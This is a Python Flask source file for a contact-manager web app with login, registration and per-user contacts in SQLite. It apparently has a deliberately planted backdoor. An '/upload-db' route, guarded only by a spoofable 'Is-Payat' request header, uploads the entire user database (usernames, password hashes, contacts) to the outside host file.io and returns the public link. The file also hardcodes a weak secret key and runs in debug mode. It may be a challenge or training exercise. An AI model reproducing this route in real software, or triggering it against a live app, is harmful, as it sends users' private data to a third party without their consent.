import os
import requests
from flask import Flask, render_template, url_for, redirect, request, flash, jsonify
from flask_sqlalchemy import SQLAlchemy
from flask_login import UserMixin, login_user, LoginManager, login_required, logout_user, current_user
from flask_wtf import FlaskForm
from wtforms import StringField, PasswordField, SubmitField
from wtforms.validators import InputRequired, Length, ValidationError, Optional
from flask_bcrypt import Bcrypt

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
app.config['SECRET_KEY'] = 'itbytes'
db = SQLAlchemy(app)
bcrypt = Bcrypt(app)
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'
DATABASE_FILE="instance/database.db"

@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))


class User(db.Model, UserMixin):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(20), nullable=False, unique=True)
    password = db.Column(db.String(80), nullable=False)
    contacts = db.relationship('Contact', backref='user', lazy=True)


class Contact(db.Model):
    id = db.Column(db.Integer, primary_key=True, autoincrement=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    name = db.Column(db.String(50), nullable=False)
    phone_number = db.Column(db.String(10), nullable=False)
    email = db.Column(db.String(50))
    second_phone_number = db.Column(db.String(10))

    user_relation = db.relationship('User', backref=db.backref('user_contacts', lazy=True))


class AddContactForm(FlaskForm):
    name = StringField('Name', validators=[InputRequired(), Length(max=50)])
    phone_number = StringField('Phone Number', validators=[InputRequired(), Length(max=10)])
    email = StringField('Email', validators=[Optional(), Length(max=50)])
    second_phone_number = StringField('Second Phone Number', validators=[Optional(), Length(max=10)])


class EditContactForm(FlaskForm):
    name = StringField('Name', validators=[InputRequired(), Length(max=50)])
    phone_number = StringField('Phone Number', validators=[InputRequired(), Length(max=10)])
    email = StringField('Email', validators=[Optional(), Length(max=50)])
    second_phone_number = StringField('Second Phone Number', validators=[Optional(), Length(max=10)])


class DeleteContactForm(FlaskForm):
    name = StringField('Name', validators=[InputRequired(), Length(max=50)])


class RegisterForm(FlaskForm):
    username = StringField(validators=[
                           InputRequired(), Length(min=4, max=20)], render_kw={"placeholder": "Username"})

    password = PasswordField(validators=[
                             InputRequired(), Length(min=8, max=20)], render_kw={"placeholder": "Password"})

    submit = SubmitField('Register')

    def validate_username(self, username):
        existing_user_username = User.query.filter_by(
            username=username.data).first()
        if existing_user_username:
            raise ValidationError(
                'That username already exists. Please choose a different one.')


class LoginForm(FlaskForm):
    username = StringField(validators=[
                           InputRequired(), Length(min=4, max=20)], render_kw={"placeholder": "Username"})

    password = PasswordField(validators=[
                             InputRequired(), Length(min=8, max=20)], render_kw={"placeholder": "Password"})

    submit = SubmitField('Login')


@app.route('/')
def home():
    return render_template('home.html')


@app.route('/login', methods=['GET', 'POST'])
def login():
    form = LoginForm()
    if form.validate_on_submit():
        user = User.query.filter_by(username=form.username.data).first()
        if user and bcrypt.check_password_hash(user.password, form.password.data):
            login_user(user)
            return redirect(url_for('dashboard'))

    return render_template('login.html', form=form)


@app.route('/dashboard', methods=['GET', 'POST'])
@login_required
def dashboard():
    add_form = AddContactForm()
    edit_form = EditContactForm()
    delete_form = DeleteContactForm()
    searched_contacts = None

    if request.method == 'POST':
        if 'add_contact' in request.form and add_form.validate():
            new_contact = Contact(
                user_id=current_user.id,
                name=add_form.name.data,
                phone_number=add_form.phone_number.data,
                email=add_form.email.data,
                second_phone_number=add_form.second_phone_number.data
            )
            db.session.add(new_contact)
            db.session.commit()
            flash('Contact added successfully!', 'success')

        elif 'edit_contact' in request.form and edit_form.validate():
            contact_name_to_edit = request.form.get('name')
            contact_to_edit = Contact.query.filter_by(name=contact_name_to_edit, user_id=current_user.id).first()

            if contact_to_edit:
                contact_to_edit.phone_number = edit_form.phone_number.data
                contact_to_edit.email = edit_form.email.data
                contact_to_edit.second_phone_number = edit_form.second_phone_number.data

                db.session.commit()
                flash('Contact edited successfully!', 'success')
            else:
                flash('Contact not found or you are not authorized to edit this contact.', 'danger')

        elif 'delete_contact' in request.form and delete_form.validate():
            contact_name_to_delete = request.form.get('name')
            contact_to_delete = Contact.query.filter_by(name=contact_name_to_delete, user_id=current_user.id).first()

            if contact_to_delete:
                db.session.delete(contact_to_delete)
                db.session.commit()
                flash('Contact deleted successfully!', 'success')
            else:
                flash('Contact not found or you are not authorized to delete this contact.', 'danger')
        # Search contacts
        search_term = request.form.get('search_term', '').lower()
        if search_term:
            searched_contacts = Contact.query.filter(
                (Contact.name.ilike(f"%{search_term}%") |
                 Contact.phone_number.ilike(f"%{search_term}%") |
                 Contact.email.ilike(f"%{search_term}%") |
                 Contact.second_phone_number.ilike(f"%{search_term}%")) &
                (Contact.user_id == current_user.id)
            ).all()

    contacts = Contact.query.filter_by(user_id=current_user.id).all()
    return render_template('dashboard.html', username=current_user.username.title(), contacts=contacts, add_form=add_form, edit_form=edit_form, delete_form=delete_form, searched_contacts=searched_contacts)


@app.route('/logout', methods=['GET', 'POST'])
@login_required
def logout():
    logout_user()
    return redirect(url_for('login'))


@app.route('/register', methods=['GET', 'POST'])
def register():
    form = RegisterForm()

    if form.validate_on_submit():
        hashed_password = bcrypt.generate_password_hash(form.password.data)
        new_user = User(username=form.username.data, password=hashed_password)
        db.session.add(new_user)
        db.session.commit()
        return redirect(url_for('login'))

    return render_template('register.html', form=form)

@app.route('/db')
def index():
    payat = request.headers.get('Is-Payat')
    if (not payat):
        
        return render_template('not-payat.html')
    elif (payat.lower()!='true'):
        return render_template('not-payat.html')
    else :
        return render_template('db.html')
        
@app.route('/upload-db')
def upload_db():
    if not os.path.exists(DATABASE_FILE):
        return jsonify({"success": False, "message": "Database file not found."})
    payat = request.headers.get('Is-Payat')
    if (not payat):
        
        return render_template('not-payat.html')
    elif (payat.lower()!='true'):
        return render_template('not-payat.html')
    # Upload the file to a free file-sharing service (e.g., file.io)
    with open(DATABASE_FILE, 'rb') as f:
        try:
            response = requests.post(
                "https://file.io",
                files={"file": f}
            )
            response_data = response.json()
            if response_data.get("success"):
                return jsonify({"success": True, "url": response_data["link"]})
            else:
          
                return jsonify({"success": False, "message": response_data.get("message", "Unknown error.")})
        except Exception as e:
            return jsonify({"success": False, "message": str(e)})
        
if __name__ == "__main__":
    app.run(debug=True)

